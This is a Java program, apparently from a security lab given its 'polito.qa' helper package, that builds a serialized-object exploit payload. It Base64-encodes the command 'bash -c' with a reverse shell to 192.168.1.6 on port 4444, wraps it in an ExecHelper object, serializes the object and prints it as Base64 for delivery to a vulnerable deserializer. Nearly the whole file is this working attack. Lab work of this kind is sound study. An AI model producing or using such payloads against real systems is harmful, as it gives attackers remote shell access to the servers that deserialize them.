import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

import com.polito.qa.utils.Base64Helper;
import com.polito.qa.utils.ExecHelper;

class Main {
	public static void main(String[] args) throws IOException {
		String arg0 = new String(Base64.getEncoder().encode("bash".getBytes()));
		String arg1 = new String(Base64.getEncoder().encode("-c".getBytes()));
		String arg2 = new String(Base64.getEncoder().encode("sh -i >& /dev/tcp/192.168.1.6/4444 0>&1".getBytes()));
		
		Base64Helper[] command = {
				new Base64Helper(arg0),
				new Base64Helper(arg1),
				new Base64Helper(arg2),
		};
		
		ExecHelper originalObject = new ExecHelper(command);
		String serializeObject = serialize(originalObject);
		
		System.out.println("Serializable obj: " + serializeObject);
	}
	
	private static String serialize(Serializable obj) throws IOException {
		ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
		try(ObjectOutputStream out = new ObjectOutputStream(baos)){
			out.writeObject(obj);
		}
		return Base64.getEncoder().encodeToString(baos.toByteArray());
	}
}